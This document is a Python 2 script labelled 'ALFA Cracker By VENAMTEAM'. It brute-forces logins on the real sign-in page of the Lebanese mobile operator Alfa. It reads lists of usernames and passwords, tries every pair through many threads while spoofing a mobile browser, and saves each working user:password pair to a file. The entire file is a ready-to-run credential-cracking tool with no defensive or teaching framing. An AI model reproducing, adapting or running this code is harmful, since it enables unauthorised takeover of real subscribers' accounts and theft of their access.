import mechanize, re
from threading import Thread


############FUNCTION THAT CUT A FILES IN MANY PARTS######################
def chunkIt(seq, num):
  avg = len(seq) / float(num)
  out = []
  last = 0.0
  while last < len(seq):
     out.append(seq[int(last):int(last + avg)])
     last += avg
  return out
###########END OF FUNCTION THAT CUT A FILE IN MANY PARTS##################

#########COLORS#####################
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[1;32m'
    WARNING = '\033[93m'
    FAIL = '\033[0;31m'
    ENDC = '\033[0m'
    CYAN = '\033[1;36m'
    COOL = '\033[0;45m'
    COOL1 = '\033[1;45m'
    backgreen ='\033[1;44m'
##################################
def crack(user,passwd):
    while 1:
        try:
            br = mechanize.Browser()
            br.set_handle_redirect(True)
            br.addheaders = [('User-agent', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1_1 like Mac OS X; en-US) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3')]
            br.open("https://www.alfa.com.lb/signin.aspx?language=1&destination=%2fsms%2fdefault.aspx%3flanguage%3d1")
            formattion = re.findall('ctl00\$ContentPlaceHolder\$txtMemberName_(.*)\" typ',br.response().read())[0]
            br.select_form(nr=0)
            br.form['ctl00$ContentPlaceHolder$txtMemberName_'+formattion]=user
            br.form['ctl00$ContentPlaceHolder$txtPassword_'+formattion]=passwd
            br.submit()
            if 'Invalid Member Login' in br.response().read():
                return False
            return True
        except:
            pass

def alfacrack(users,passwds,filex):
    for passwd in passwds:
        for user in users:
            user2=user
            while user.endswith("\n") or user.endswith("\r"):
                user = user[:-1]
            while passwd.endswith("\n") or passwd.endswith("\r"):
                passwd = passwd[:-1]
            if crack(user,passwd):
                print "\n["+ bcolors.OKGREEN +"+"+ bcolors.ENDC +"] "+ bcolors.backgreen +passwd+ bcolors.ENDC +" IS THE RIGHT PASSWD FOR {"+ bcolors.backgreen +user+ bcolors.ENDC +"}"
                users.remove(user2)
                open(filex,'a').write(user+":"+passwd+"\n")


emails = open(raw_input("\n"+ bcolors.COOL +"|---"+ bcolors.COOL1 +" ALFA Cracker By VENAMTEAM"+ bcolors.COOL +" ---|"+ bcolors.ENDC +"\n\n["+ bcolors.CYAN +"*"+ bcolors.ENDC +"] users location :\n"+bcolors.OKGREEN +"=>"+bcolors.ENDC +" ")).readlines()
passwds = open(raw_input("\n["+ bcolors.CYAN +"*"+ bcolors.ENDC +"]passwds location :\n"+bcolors.OKGREEN +"=>"+bcolors.ENDC +" ")).readlines()
filex = raw_input("\n["+ bcolors.CYAN +"*"+ bcolors.ENDC +"]Location of the File you want to save to :\n"+bcolors.OKGREEN +"=>"+bcolors.ENDC +" ")

nbthread = input("\n["+ bcolors.CYAN +"*"+ bcolors.ENDC +"]Number of thread running at the same time :\n"+bcolors.OKGREEN +"=>"+bcolors.ENDC +" ")

if len(emails)<nbthread:
    nbthread=len(emails)

z = chunkIt(emails,nbthread)
for chinese in z:
    Thread(target=alfacrack, args=(chinese,passwds,filex)).start()

